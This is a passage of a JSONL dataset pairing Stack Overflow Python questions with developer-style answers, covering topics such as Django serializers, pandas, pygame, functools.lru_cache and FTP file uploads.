another sentence!&quot;, 'My... my... Another one.', &quot;Dear god.... -sigh- here's another one.&quot;, 'I might stop here.']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Extended User Model not updating<p>Hii I'am new to Django rest frame work and was preparing API's So this is my\nmodels.py<\/p>\n<pre><code>class User(auth.models.User, auth.models.PermissionsMixin):\n    def __str__(self):\n    return &quot;@{}&quot;.format(self.username)\n\nclass User_log(models.Model):\n    user = models.OneToOneField(auth.models.User,on_delete=models.CASCADE,related_name='user_logs')\n    fullname=models.CharField(max_length=255)\n    fb_login=models.BooleanField(default=False)\n    def __str__(self):\n        return self.fullname\n<\/code><\/pre>\n<p>serializers.py<\/p>\n<pre><code>class userSerializers(serializers.ModelSerializer):\n    fullname = serializers.StringRelatedField(source='user_logs.fullname',read_only=False)\n    fb=serializers.BooleanField(source='user_logs.fb_login')\n    class Meta:\n        model = User\n        fields=('id','username','email','fullname','fb')\n        related_fields = ['user_logs']\n    def update(self, instance, validated_data):\n        # Handle related objects\n        for related_obj_name in self.Meta.related_fields:\n        print('exe')\n        print(instance,validated_data)\n        # Validated data will show the nested structure\n        data = validated_data.pop(related_obj_name)\n        related_instance = getattr(instance, related_obj_name)\n\n        # Same as default update implementation\n        for attr_name, value in data.items():\n            setattr(related_instance, attr_name, value)\n        related_instance.save()\n        return super(userSerializers,self).update(instance, validated_data)\n<\/code><\/pre>\n<p>viewset.py<\/p>\n<pre><code>class Userview(viewsets.ModelViewSet):\n    queryset = User.objects.all()\n    serializer_class=userSerializers\n<\/code><\/pre>\n<p>Now the problem: whenever i try to update fullname column through json request<br>\n<code>{ &quot;id&quot;: 2,&quot;username&quot;: &quot;karam&quot;,&quot;email&quot;: &quot;karam@83ideas.com&quot;,&quot;fullname&quot;: &quot;karm&quot;,&quot;fb&quot;: true }<\/code><br> i am getting this error <code>&quot;POST \/accounts\/accounts\/2\/ HTTP\/1.1&quot; 405 41<\/code>\nand as in serializers.py update method i have printed the validated data instead of this<\/p>\n<pre><code>karam {'username': 'karam', 'email': 'karam@83ideas.com', 'user_logs': {'fullname':'karam','fb_login': True}}\n<\/code><\/pre>\n<p>i am getting this<\/p>\n<pre><code>karam {'username': 'karam', 'email': 'karam@83ideas.com', 'user_logs': {'fb_login': True}}\n<\/code><\/pre>\n<p><a href=\"https:\/\/i.stack.imgur.com\/2VSjF.png\" rel=\"nofollow noreferrer\"><img src=\"https:\/\/i.stack.imgur.com\/2VSjF.png\" alt=\"enter image description here\" \/><\/a>\nSO any idea how to resolve it?<\/p>","output_text":"<p>Instead of using StringRelatedField in serializers.py use CharField.<\/p>\n<pre><code>class userSerializers(serializers.ModelSerializer):\nfullname=serializers.CharField(source='user_logs.fullname')\nfb=serializers.BooleanField(source='user_logs.fb_login')\nclass Meta:\n    model = User\n    fields=('id','username','email','fullname','fb')\n    related_fields = ['user_logs']\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Is this important to clean test data?<p>In the training data, I did feature engineering and clean my data. Is this important to do the same with test data?\nI know some basic modifications like label encoding, dependent\/independent feature split, etc.. are required in test data as well. But do we really need to CLEAN the test data before we do the predictions? <\/p>","output_text":"<p>I can't answer you with Yes or No so let me start with the data distribution on all of your Train\/Test\/Dev set.\nAccording to Prof.Andrew ng, the Test and Dev set should come from the same distribution (<a href=\"https:\/\/www.youtube.com\/watch?v=M3qpIzy4MQk\" rel=\"nofollow noreferrer\">Youtube<\/a>), but the trainig set can come from a different distribution (<a href=\"https:\/\/www.youtube.com\/watch?v=jyjJ-RpQ5zQ\" rel=\"nofollow noreferrer\">Check it here<\/a>), and often it's a good thing to do.\nSometimes cleaning the trainig set is very useful and also applying some basic operation for speeding the training process(Like Normalization which is not cleaning), but we are talking about training data which can and should have thousands of thousands of examples, so sometimes you can't check your data manually and clean it, Because it's maybe not worthy at all;\nWhat do I mean? well let me show you an example: <\/p>\n\n<p>Let's say you're bulding a cat classifier (Cat or no-Cat), and you have an accuracy of 90%, which means that you've 10% Error.\nafter doing Error-analysis(<a href=\"https:\/\/www.youtube.com\/watch?v=JoAxZsdw_3w\" rel=\"nofollow noreferrer\">Check it here<\/a>) you find out that: <\/p>\n\n<ol>\n<li>6% of your error is caused of misslabeled images,(No-cat images<br>\nlabeled as cat and viceversa).<\/li>\n<li>44% is caused of Blurry images.<\/li>\n<li>50% is caused by images of Big Cats labeled as cats.\nin this case all the time your will spend fixing the misslabeled images will improve your performance (0.6%) in the best scenario (Because it's 6% from the whole 10% error), so <strong>IT'S NOT WORTHY<\/strong> correcting the misslabeld data.<\/li>\n<\/ol>\n\n<h2>I gave an example on misslabeled data, but in general I mean any type of cleaning and fixing.<\/h2>\n\n<p><strong>BUT cleaning<\/strong> the data in the test set may be easier, and it should be done both to Test\/Dev sets if it's possibile because your test set will reflect the performance of your system on the real time data.\nThe Operations that you mentioned in your question are not quite cleaning but used for speeding up the process of learning or make the data apprpriate for the algorithm, and applying them depends on the shape and type of the data(images, Voice Records, words..), and on the problem you're trying to solve.<\/p>\n\n<p>in the end As an answer, I can tell you that:<\/p>\n\n<ul>\n<li>the form and shape of the data should be the same in all the three\nsets (so applying label encoding should be for the whole data, not just\nfor the training data, and also for the input data used for\nprediction because it changes the shape of the output label).<\/li>\n<li>The number of features should be the same always. <\/li>\n<li>Any operation that changes the (shape, form, number of features, ...) applied to the data should be applied on every single sample that you're gonna use in your system. <\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n NameError: name 'heigth' is not defined<p>I am inexperienced in python.<\/p>\n<p>I'm doing a college activity and I wrote a class to find the height of a binary tree.<\/p>\n<p>But when I'm going to call the function recursively I have the message:<\/p>\n<pre><code>NameError                                 Traceback (most recent call last)\n&lt;ipython-input-5-109fbd93416e&gt; in &lt;module&gt;\n      7 raiz.insert(3)\n      8 \n----&gt; 9 heigth(raiz)\n\nNameError: name 'heigth' is not defined \n\n<\/code><\/pre>\n<p>The function is :<\/p>\n<pre><code>def heigth(self, n:&quot;Node&quot;)-&gt; int:\n        if n:\n            return 1\n        else:\n            left = heigth(n.left)\n            right = heigth(n.right)\n            if(left &lt; right):\n                return right + 1\n            else:\n                return left + 1\n<\/code><\/pre>\n<p>All code:<\/p>\n<pre><code>from typing import List\n\nclass Node:\n    def __init__(self, key, left:&quot;Node&quot;=None, right:&quot;Node&quot;=None):\n        self.key = key\n        self.left = left\n        self.right = right\n\n    def print_tree(self):\n        &quot;&quot;&quot;\n        Prints the tree from the current node\n        &quot;&quot;&quot;\n        if self.left:\n            self.left.print_tree()\n        print(self.key, end=&quot; &quot;)\n        if self.right:\n            self.right.print_tree()\n\n\n    def insert(self, key) -&gt; bool:\n        &quot;&quot;&quot;\n        Insert a node in the tree that has the key &quot;key&quot;\n        &quot;&quot;&quot;\n        if key &lt; self.key:\n            if self.left:\n                return self.left.insert(key)\n            else:\n                self.left = Node(key)\n                return True\n        elif key &gt; self.key:\n            if self.right:\n                return self.right.insert(key)\n            else:\n                self.right = Node(key)\n                return True\n        else:\n            return False\n\n\n    def search(self, key) -&gt; bool:\n        &quot;&quot;&quot;\n        Returns true if the key exists in the tree\n        &quot;&quot;&quot;\n        if key &lt; self.key:\n            if self.left:\n                return self.left.search(key)\n        elif key &gt; self.key:\n            if self.right:\n                return self.right.search(key)\n        else:\n            return True\n        return False\n\n\n    def to_sorted_array(self, arr_result:List =None) -&gt; List:\n        &quot;&quot;&quot;\n        Returns a vector of the ordered keys.\n        arr_result: Parameter with the items already added.\n        &quot;&quot;&quot;\n        if(arr_result == None):\n            arr_result = []\n\n        if self.left:\n            self.left.to_sorted_array(arr_result)\n\n        arr_result.append(self.key)\n\n        if self.right:\n            self.right.to_sorted_array(arr_result)\n        return arr_result\n\n    def max_depth(self,current_max_depth:int=0) -&gt; int:\n        &quot;&quot;&quot;\n        calculates the greatest distance between the root node and the leaf\n        current_max_depth: Value representing the longest distance so far\n                           when calling for the first time, there is no need to use it\n        &quot;&quot;&quot;\n        current_max_depth = current_max_depth +1\n        val_left,val_right = current_max_depth,current_max_depth\n\n        if self.left:\n            val_left = self.left.max_depth(current_max_depth)\n        if self.right:\n            val_right = self.right.max_depth(current_max_depth)\n\n        if(val_left&gt;val_right):\n            return val_left\n        else:\n            return val_right\n\n    def position_node(self, key, current_position:int=1) -&gt; int:\n        &quot;&quot;&quot;\n            Returns the position of the desired node in the tree\n            current_position: represents the position of the tree at that moment\n                           when calling for the first time, there is no need to use it\n        &quot;&quot;&quot;\n        if key &lt; self.key:\n            if self.left:\n                return self.left.position_node(key, current_position*2)\n        elif key &gt; self.key:\n            if self.right:\n                return self.right.position_node(key, current_position*2+1)\n        else:\n            return current_position\n\n    def heigth(self, n:&quot;Node&quot;)-&gt; int:\n        if n:\n            return 1\n        else:\n            left = heigth(n.left)\n            right = heigth(n.right)\n            if(left &lt; right):\n                return right + 1\n            else:\n                return left + 1\n\n<\/code><\/pre>","output_text":"<p>You are using method of a class, but when you refer to it just as a <code>heigth<\/code> it looks for the method not in a class of the object, but on a module level where it can't find it, hence the error.<\/p>\n<p>Try replacing <code>heigth<\/code> calls with <code>self.heigth<\/code>, so that method of a class is called.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n AttributeError: 'function' object has no attribute 'cache_info' with functools.lru_cache + argument formatting decorator discrepancy<p>I made up this simple, contrived example of some code I ran into at work. I'm trying to better understand why slow_function_1 (+ the way its decorators are structured) would cache function results properly, but the decorator applied to slow_function_2 would not. In this example, I'm trying to access cache information after calling the method; however, I consistently get the following error: <code>AttributeError: 'function' object has no attribute 'cache_info'<\/code>. I've searched high and low to try to fix this, but to no avail. This AttributeError is raised for both <code>slow_function_1.cache_info()<\/code> and <code>slow_function_2.cache_info()<\/code><\/p>\n<p>How do I view the cache between function calls? If anyone has any insight on the original problem of why slow_function_1 and slow_function_2 differ in caching behavior, I would appreciate that as well.<\/p>\n<p>Thank you in advance!<\/p>\n<pre><code>import functools\nimport time\n\ndef format_args(func):\n    def inner(*args, **kwargs):\n        formatted_args = [tuple(x) if type(x) == list else x for x in args]\n        return func(*formatted_args, **kwargs)\n    return inner\n\ndef formatted_cache(func):\n    def inner(*args, **kwargs):\n        formatted_args = [tuple(x) if type(x) == list else x for x in args]\n        return functools.lru_cache()(func)(*formatted_args, **kwargs)\n    return inner\n\n@format_args\n@functools.lru_cache\ndef slow_function_1(a: list, b: bool):\n    time.sleep(1)\n    print(&quot;executing slow function 1&quot;)\n    return sum(a)\n\n\n@formatted_cache\ndef slow_function_2(a: list, b: bool):\n    time.sleep(1)\n    print(&quot;executing slow function 2&quot;)\n    return functools.reduce((lambda x, y: x*y), a)\n\n\nexample_list = [1,2,3,4,5,6,7,8,9,10,11,12]\nexample_bool = True\n\nslow_function_1(example_list, example_bool)\nprint(slow_function_1.cache_info())\nslow_function_1(example_list, example_bool)\nprint(slow_function_1.cache_info())\n\n\nslow_function_2(example_list, example_bool)\nprint(slow_function_2.cache_info())\nslow_function_2(example_list, example_bool)\nprint(slow_function_2.cache_info())\n\n<\/code><\/pre>","output_text":"<p>Now that I stared at it for a good time, I don't think it's really possible to do this with a decorator. You need a <code>lru_cache<\/code> object to access the cache and all that stuff, and you need a second function to format the arguments to be hashable before passing to the <code>lru_cache<\/code> object. The decorator can't return both at once, and they can't be nested in each other to make one function with the best of both worlds.<\/p>\n<pre><code>def formatted_cache(func):\n    # first we assume func only takes in hashable arguments\n    # so cachedfunc only takes in hashable arguments\n    cachedfunc = functools.lru_cache(func)\n    \n    # inner formats lists to hashable tuples\n    # then passes it to cachedfunc\n    def inner(*args, **kwargs):\n        formatted_args = [tuple(x) if type(x) == list else x for x in args]\n        return cachedfunc(*formatted_args, **kwargs)\n    \n    # oh no, we can only return one function, but neither is good enough\n<\/code><\/pre>\n<p>I think the only way to move forward is to just accept that these have to be done in separate functions because of <code>lru_cache<\/code>'s limitation. It's not that awkward, actually, just a simple higher order function like <code>map<\/code>.<\/p>\n<pre><code>import functools\nimport time\n\ndef formatted_call(func, *args, **kwargs):\n    formatted_args = [tuple(x) if type(x) == list else x for x in args]\n    return func(*formatted_args, **kwargs)\n\n@functools.lru_cache\ndef slow_function_2(a: list, b: bool):\n    time.sleep(1)\n    print(&quot;executing slow function 2&quot;)\n    return functools.reduce((lambda x, y: x*y), a)\n\nexample_list = [1,2,3,4,5,6,7,8,9,10,11,12]\nexample_bool = True\n\nformatted_call(slow_function_2, example_list, example_bool)\nprint(slow_function_2.cache_info())\nformatted_call(slow_function_2, example_list, example_bool)\nprint(slow_function_2.cache_info())\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n run script from spyder console using relative path<p>I want to run .py file from ipython console in spyder. Script also takes csv file as input. But I got <code>Exception: File src.py not found<\/code>. How do I run the script from spyder console using relative path?<\/p>\n<pre><code>run src.py input.csv\n<\/code><\/pre>","output_text":"<p>In this format, the path to your file is relative to the command working directory. Therefore, with your command, it looks for <code>src.py<\/code> in the directory where the console is running (that you can check by running <code>pwd<\/code>).<\/p>\n<p>Therefore, you should either :<\/p>\n<ul>\n<li>input absolute paths<\/li>\n<li>open the command to the directory where your files (the script and the csv) are<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How can I use Numba \"@vectorize\" ufunc with a structured Numpy array?<p>I'm unable to get a vectorized ufunc to run.  Regular @njit works fine and the <a href=\"https:\/\/numba.pydata.org\/numba-doc\/dev\/reference\/jit-compilation.html#numba.vectorize\" rel=\"nofollow noreferrer\">@vectorize documentation<\/a> suggests that the vectorize decorators are the same as njit.  I'm running on Windows 10, if that makes a difference<\/p>\n\n<p>The demo program is as follows.  From the output below that we can see that the njit function runs without incident and there's a type error with the vectorized function.<\/p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import sys\nimport numpy\nimport numba\n\nStructured = numpy.dtype([(\"a\", numpy.int32), (\"b\", numpy.float64)])\nnumba_dtype = numba.from_dtype(Structured)\n\n@numba.njit([numba.float64(numba_dtype)])\ndef jitted(x):\n    x['b'] = 17.5\n    return 18.\n\n@numba.vectorize([numba.float64(numba_dtype)], target=\"cpu\", nopython=True)\ndef vectorized(x):\n    x['b'] = 17.5\n    return 12.1\n\nprint('python version = ', sys.implementation.version)    \nprint('numpy version = ', numpy.__version__)\nprint('numba version = ', numba.__version__)\nfor struct in numpy.empty((3,), dtype=Structured):\n    print(jitted(struct))\n\nprint(vectorized(numpy.empty((3,), dtype=Structured)))\n<\/code><\/pre>\n\n<p>And the output is<\/p>\n\n<blockquote>\n  <p>python version =  sys.version_info(major=3, minor=7, micro=1, releaselevel='final', serial=0)<br>\n  numpy version =  1.17.3<br>\n  numba version =  0.48.0<br>\n  18.0<br>\n  18.0<br>\n  18.0<br>\n  Traceback (most recent call last):   File \"scratch.py\", line 49, in <br>\n      print(vectorized(numpy.empty((3,), dtype=Structured))) TypeError: ufunc 'vectorized' not supported for the input types, and the inputs could not be safely coerced to any supported types according to the casting rule ''safe''  <\/p>\n<\/blockquote>","output_text":"<p>It looks like this is not supported, has been converted to a <a href=\"https:\/\/github.com\/numba\/numba\/issues\/5329\" rel=\"nofollow noreferrer\">feature request<\/a><\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Python CSV, elements remain on same cell in txt file<p>So I'm trying to create several columns for information, and I'm naming the columns, or the labels in top of the columns, but the code writes them in the following way: <\/p>\n\n<pre><code>Name,Age,Height,Weight,Budget,Objective,Type of diet\n<\/code><\/pre>\n\n<p>And all of this in one single cell, and I want them to be each in a different column. The code is the following: <\/p>\n\n<pre><code>import csv\n\nfields = [\"Name\",\"Age\", \"Height\", \"Weight\", \"Budget\", \"Objective\",  '''Type of diet''']\nfilename = \"nutritec.csv\"\n\nwith open(filename, 'w+') as csvfile:\n    csvwriter = csv.writer(csvfile)\n    csvwriter.writerow(fields)\n<\/code><\/pre>","output_text":"<p>Okay so after some time, i found how that the problem happes due to Windows configuration. I solved it changing the \",\" deep into windows configuration. <\/p>\n\n<ol>\n<li>Go to Windows Settings <\/li>\n<li>Go to Time and Language <\/li>\n<li>Additional Options of Date, Time and Regional Settings<\/li>\n<li>Change date, time and number formats<\/li>\n<li>Additional Settings <\/li>\n<li>Change \"List separator\" by a ,<\/li>\n<\/ol>\n\n<p>Sorry if the words are wrong, not natal language and windows is in different language<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to compute the recurrence formula without using array<p>I'd like to compute the y_{n+1} = (a * y_n * b) + (b * y_n * a), where a and b are some matrix respectively.<\/p>\n<p>And I coded this recurrence formula using array for yn.<\/p>\n<pre><code>yn = []\nfor n in range(30):\n    if n == 0:\n        yn.append(a.dot(b) + b.dot(a))\n    else:\n        yn.append(a.dot(yn[n-1]).dot(b) + b.dot(yn[n-1]).dot(a))\n<\/code><\/pre>\n<p>However, it turned out this code doesn't work well for large sized matrix because of the memory problem. So, I want a another way to compute this without using array. Can someone help me to solve this?<\/p>","output_text":"<p>Just one variable.<\/p>\n<pre><code>y = a.dot(b) + b.dot(a)\nfor n in range(1, 30):\n    y = a.dot(y).dot(b) + b.dot(y).dot(a)\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Getting values out of a DataFrame which is in a Dictionary<p>I have a Pandas DataFrame inside a Dictionary.<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>online_dict={&quot;current ferm&quot;: Werte_df}\n<\/code><\/pre>\n<p>The DataFrame consists of 5 columns with the headers and an index t<br \/>\n<code>Messzeit, Baset_2; CO2; CO2_pressure; Base_rate<\/code>.<\/p>\n<p>I now want to split this dictionary into multiple dictionaries.<\/p>\n<p>For example I want to have one dictionary called<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>Base_dict = {'current ferm': Base_df}.\n<\/code><\/pre>\n<p>Thus I need to extract specific columns from the <code>Werte_df<\/code><\/p>\n<p><strong>How can I extract these values and create a new DataFrame?<\/strong><\/p>","output_text":"<p>To give you a simple and quick answer the solution is:<\/p>\n<p>if you need 1 column:<\/p>\n<pre><code>Base_df = Werte_df['Base_rate']\n<\/code><\/pre>\n<p>if you would need 2 or more columns:<\/p>\n<pre><code>Base_df = Werte_df[['Base_rate', 'Baset_2']]\n<\/code><\/pre>\n<p>But like has been suggested in the comments you should do some learning about dataframes, as this is very basic. Learning about dataframes will open many more programming possibilities for you.<\/p>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Why is this start_pos invalid?<p>Why does this code not work?<\/p>\n<pre><code>def grid(vl):\n    vl_var = screen.get_width() \/ vl\n    i = 1\n    while True:\n        if i == vl:\n            i = 1\n            break\n        else:\n            pygame.draw.line(screen, (94, 94, 94), vl_var * i, vl_var * i * screen.get_width())\n            i += 1\n<\/code><\/pre>\n<p>When executing this program, i get the following error<\/p>\n<pre><code>TypeError: invalid start_pos argument\n<\/code><\/pre>\n<p>I have no idea why this would be invalid...<\/p>","output_text":"<p>To draw a line you need to specify the start and end position. A position is a tuple with a <em>x<\/em> and <em>y<\/em> coordinate. <a href=\"http:\/\/www.pygame.org\/docs\/ref\/draw.html#pygame.draw.line\" rel=\"nofollow noreferrer\"><code>pygame.draw.line<\/code><\/a> draws a line from a start and end position specified in the third and fourth parameters. e.g.:<\/p>\n<pre class=\"lang-py prettyprint-override\"><code>def grid(vl, hl):\n    width, height = screen.get_size()\n    vl_var = width \/\/ vl\n    hl_var = height \/\/ hl\n    # vertical lines\n    for i in range(vl+1):\n        pygame.draw.line(screen, (94, 94, 94), (vl_var*i, 0), (vl_var*i, height))\n    # horiontal lines\n    for i in range(hl+1):\n        pygame.draw.line(screen, (94, 94, 94), (0, hl_var*i), (width, hl_var*i))\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n How to assign multiple categories based on a condition<p>Here are the categories each with a list of words ill be checking the rows for match:<\/p>\n<pre><code>fashion = ['bag','purse','pen']\ngeneral = ['knob','hanger','bottle','printing','tissues','book','tissue','holder','heart']\ndecor =['holder','decoration','candels','frame','paisley','bunting','decorations','party','candles','design','clock','sign','vintage','hanging','mirror','drawer','home','clusters','placements','willow','stickers','box']\nkitchen = ['pantry','jam','cake','glass','bowl','napkins','kitchen','baking','jar','mug','cookie','bowl','placements','molds','coaster','placemats']\nholiday = ['rabbit','ornament','christmas','trinket','party']\ngarden = ['lantern','hammok','garden','tree']\nkids = ['children','doll','birdie','asstd','bank','soldiers','spaceboy','childs']\n<\/code><\/pre>\n<p>Here is my code: (I am checking sentences for keywords and assign the row a category accordingly. I want to allow overlapping, so one row could have more than one category)<\/p>\n<pre><code>#check if description row contains words from one of our category lists\ndf['description'] = np.select(\n    [\n        (df['description'].str.contains('|'.join(fashion))),\n        (df['description'].str.contains('|'.join(general))), \n        (df['description'].str.contains('|'.join(decor))),\n        (df['description'].str.contains('|'.join(kitchen))),\n        (df['description'].str.contains('|'.join(holiday))),\n        (df['description'].str.contains('|'.join(garden))),\n        (df['description'].str.contains('|'.join(kids)))\n    ],\n    ['fashion','general','decor','kitchen','holiday','garden','kids'], \n    'Other'\n)\n<\/code><\/pre>\n<pre><code>Current Output:\n\nindex         description         category\n0         children wine glass     kids\n1         candles                 decor \n2         christmas tree          holiday\n3         bottle                  general\n4         soldiers                kids\n5         bag                     fashion\n\n\nExpected Output:\n\nindex         description         category\n0         children wine glass     kids, kitchen\n1         candles                 decor\n2         christmas tree          holiday, garden\n3         bottle                  general\n4         soldiers                kids\n5         bag                     fashion\n<\/code><\/pre>","output_text":"<p>Here's an option using <code>apply()<\/code>:<\/p>\n<pre><code>df = pd.DataFrame({'description': ['children wine glass',\n'candles',\n'christmas tree',\n'bottle',\n'soldiers',\n'bag']})\n\ndef categorize(desc):\n    lst = []\n    for w in desc.split(' '):\n        if w in fashion:\n            lst.append('fashion')\n        if w in general:\n            lst.append('general')\n        if w in decor:\n            lst.append('decor')\n        if w in kitchen:\n            lst.append('kitchen')\n        if w in holiday:\n            lst.append('holiday')\n        if w in garden:\n            lst.append('garden')\n        if w in kids:\n            lst.append('kids')\n    return ', '.join(lst)\n            \n   df.apply(lambda x: categorize(x.description), axis=1)\n<\/code><\/pre>\n<p>Outuput:<\/p>\n<pre><code>0      kids, kitchen\n1              decor\n2    holiday, garden\n3            general\n4               kids\n5            fashion\n<\/code><\/pre>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n Writing to data in Python to a local file and uploading to FTP at the same time does not work<p>I have this weird issue with my code on Raspberry Pi 4.<\/p>\n\n<pre><code>from gpiozero import CPUTemperature\nfrom datetime import datetime\nimport ftplib\n\ncpu = CPUTemperature()\nnow = datetime.now()\ntime = now.strftime('%H:%M:%S')\n\n# Save data to file\nf = open('\/home\/pi\/temp\/temp.txt', 'a+')\nf.write(str(time) + ' - Temperature is: ' + str(cpu.temperature) + ' C\\n')\n\n# Login and store file to FTP server\nftp = ftplib.FTP('10.0.0.2', 'username', 'pass')\nftp.cwd('AiDisk_a1\/usb\/temperature_logs')\nftp.storbinary('STOR temp.txt', f)\n\n# Close file and connection\nftp.close()\nf.close()\n<\/code><\/pre>\n\n<p>When I have this code, script doesn't write anything to the .txt file and file that is transferred to FTP server has size of 0 bytes.<\/p>\n\n<p>When I remove this part of code, script is writing to the file just fine.<\/p>\n\n<pre><code># Login and store file to FTP server\nftp = ftplib.FTP('10.0.0.2', 'username', 'pass')\nftp.cwd('AiDisk_a1\/usb\/temperature_logs')\nftp.storbinary('STOR temp.txt', f)\n\n...\n\nftp.close()\n<\/code><\/pre>\n\n<p>I also tried to write some random text to the file and run the script, and the file transferred normally.<\/p>\n\n<p>Do you have any idea, what am I missing? <\/p>","output_text":"<p>After you write the file, the file pointer is at the end. So if you pass file handle to <code>FTP<\/code>, it reads nothing. Hence nothing is uploaded.<\/p>\n\n<p>I do not have a direct explanation for the fact the local file ends up empty. But the strange way of combining \"append\" mode and reading may be the reason. I do not even see <code>a+<\/code> mode defined in <a href=\"https:\/\/docs.python.org\/3\/library\/functions.html#open\" rel=\"nofollow noreferrer\"><code>open<\/code> function documentation<\/a>.<\/p>\n\n<hr>\n\n<p>If you want to both append data to a local file and FTP, I suggest your either:<\/p>\n\n<ul>\n<li>Append the data to the file \u2013 Seek back to the original position \u2013 And upload the appended file contents.<\/li>\n<li>Write the data to memory and then separately 1) dump the in-memory data to a file and 2) upload it.<\/li>\n<\/ul>"}
{"input_text_instruct":"Please answer the following Stackoverflow question on Python. Answer it like you are a developer answering Stackoverflow questions.\n\nStackoverflow question:\n maximum variation within one second for each row of a DataFrame<p>I'm having a calculation problem with pandas and I'd like to know if anyone could help me.<\/p>\n\n<p>Having this df created using this code:<\/p>\n\n<pre><code>df = pd.DataFrame({'B': [0, 2, 1, np.nan, 4, 1, 3, 10, np.nan, 3, 6]},\n                  index = [pd.Timestamp('20130101 09:31:23.999'),\n                           pd.Timestamp('20130101 09:31:24.200'),\n                           pd.Timestamp('20130101 09:31:24.250'),\n                           pd.Timestamp('20130101 09:31:25.000'),\n                           pd.Timestamp('20130101 09:31:25.375'),\n                           pd.Timestamp('20130101 09:31:25.850'),\n                           pd.Timestamp('20130101 09:31:26.100'),\n                           pd.Timestamp('20130101 09:31:27.150'),\n                           pd.Timestamp('20130101 09:31:28.050'),\n                           pd.Timestamp('20130101 09:31:28.850'),\n                           pd.Timestamp('20130101 09:31:29.200')])\n<\/code><\/pre>\n\n<pre><code>df\n\n|                         | B    |\n|-------------------------|------|\n| 2013-01-01 09:31:23.999 | 0.0  |\n| 2013-01-01 09:31:24.200 | 2.0  |\n| 2013-01-01 09:31:24.250 | 1.0  |\n| 2013-01-01 09:31:25.000 | NaN  |\n| 2013-01-01 09:31:25.375 | 4.0  |\n| 2013-01-01 09:31:25.850 | 1.0  |\n| 2013-01-01 09:31:26.100 | 3.0  |\n| 2013-01-01 09:31:27.150 | 10.0 |\n| 2013-01-01 09:31:28.050 | NaN  |\n| 2013-01-01 09:31:28.850 | 3.0  |\n| 2013-01-01 09:31:29.200 | 6.0  |\n<\/code><\/pre>\n\n<p>I would like to be able to calculate for each row what the maximum variation of B has been during one second.<\/p>\n\n<p>For example, in the first row you would have to look at how much it has changed with respect to the second row and the third row which are those within the interval of a second and calculate the difference with the maximum value. <\/p>\n\n<p>In this case, the maximum value is in the second row \"09:31:24.200\", the maximum variation will be 2 - 0.<\/p>\n\n<p>Then, we will create a new column with all these maximum variations for each of the rows.<\/p>\n\n<pre><code>df\n\n|                         | B    | Maximum Variation  |\n|-------------------------|------|--------------------|\n| 2013-01-01 09:31:23.999 | 0.0  | 2.0                |\n| 2013-01-01 09:31:24.200 | 2.0  | 1.0                |\n| 2013-01-01 09:31:24.250 | 1.0  | 0.0                |\n| 2013-01-01 09:31:25.000 | NaN  | 4.0                |\n| 2013-01-01 09:31:25.375 | 4.0  |-3.0                |\n| 2013-01-01 09:31:25.850 | 1.0  | 2.0                |\n| 2013-01-01 09:31:26.100 | 3.0  | 0.0                |\n| 2013-01-01 09:31:27.150 | 10.0 | 0.0                |\n| 2013-01-01 09:31:28.050 | NaN  | 3.0                |\n| 2013-01-01 09:31:28.850 | 3.0  | 3.0                |\n| 2013-01-01 09:31:29.200 | 6.0  | 0.0                |\n<\/code><\/pre>\n\n<p>I hope it's clear enough<\/p>\n\n<p><strong>Solution has been found and shared in the answers, but still an efficiency improvement in this solution that doesn't involve having to make a loop for each row of the df, will be more than welcome<\/strong><\/p>","output_text":"<p>I've finally found the solution:<\/p>\n\n<pre><code>df = pd.DataFrame({'B': [0, 1, 2, 8, 6, 1, 3, 10, np.nan, 3, 6]},\n                  index = [pd.Timestamp('20130101 09:31:23.999'),\n                           pd.Timestamp('20130101 09:31:24.200'),\n                           pd.Timestamp('20130101 09:31:24.250'),\n                           pd.Timestamp('20130101 09:31:25.000'),\n                           pd.Timestamp('20130101 09:31:25.375'),\n                           pd.Timestamp('20130101 09:31:25.850'),\n                           pd.Timestamp('20130101 09:31:26.100'),\n                           pd.Timestamp('20130101 09:31:27.150'),\n                           pd.Timestamp('20130101 09:31:28.050'),\n                           pd.Timestamp('20130101 09:31:28.850'),\n                           pd.Timestamp('20130101 09:31:29.200')])\n\ndf = df.reset_index()\n\ndf = df.rename(columns={\"index\": \"start_date\"})\n\ndf['duration_in_seconds'] = 1\n\ndf['end_date'] = df['start_date'] + pd.to_timedelta(df['duration_in_seconds'], unit='s')\n\ndf['max'] = np.nan\n\nfor index, row in df.iterrows():\n    start = row['start_date']\n    end = row['end_date']\n    maxi = df[(df['start_date'] &gt;= start ) &amp; (df['start_date'] &lt;= end)]['B'].max()\n    df.iloc[index, df.columns.get_loc('max')] = maxi\n\ndf['Maximum Variation'] = df['max'] - df['B']\n\ndf\n\n|    | start_date              | B    | duration_in_seconds | end_date                | max  | Maximum Variation 